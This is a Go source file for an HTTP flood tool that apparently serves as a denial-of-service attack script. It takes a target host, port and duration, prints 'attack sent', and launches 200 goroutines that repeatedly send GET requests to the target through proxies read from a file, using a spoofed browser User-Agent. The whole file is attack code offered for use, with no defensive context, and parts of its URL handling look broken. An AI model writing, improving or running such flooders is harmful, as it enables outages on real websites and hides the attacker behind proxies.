package main

import (
	"bufio"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var STOP bool

func main() {
	duration, _ := strconv.Atoi(os.Args[3])
	fmt.Println("--> attack sent!!")
	go timer(duration)

	proxies, err := loadProxies("proxy.txt")
	if err != nil {
		fmt.Println("Error loading proxies:", err)
		return
	}

	for i := 0; i < 200; i++ {
		go RAWFLOOD(os.Args[1]+":"+os.Args[2], proxies)
		time.Sleep(200 * time.Millisecond)
	}
	time.Sleep(time.Duration(duration) * time.Second)
}

func loadProxies(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return proxies, nil
}

func timer(duration int) {
	time.Sleep(time.Duration(duration) * time.Second)
	STOP = true
}

func RAWFLOOD(target string, proxies []string) {
	site, _ := url.Parse(target)
	path := strings.Replace(site.Path, ":"+strings.Split(target, ":")[2], "", -1)

	for _, proxy := range proxies {
		restart:
		if STOP == true {
			os.Exit(0)
		}
		
		proxyURL, err := url.Parse("http://" + proxy)
		if err != nil {
			fmt.Println("Error parsing proxy:", err)
			continue
		}
		
		client := &http.Client{
			Transport: &http.Transport{
				Proxy: http.ProxyURL(proxyURL),
			},
			Timeout: 5 * time.Second,
		}
		
		req, err := http.NewRequest("GET", "http://"+site.Host+":"+strings.Split(target, ":")[2]+path, nil)
		if err != nil {
			fmt.Println("Error creating request:", err)
			continue
		}
		
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0")
		
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error sending request:", err)
			goto restart
		}
		defer resp.Body.Close()
	}
}
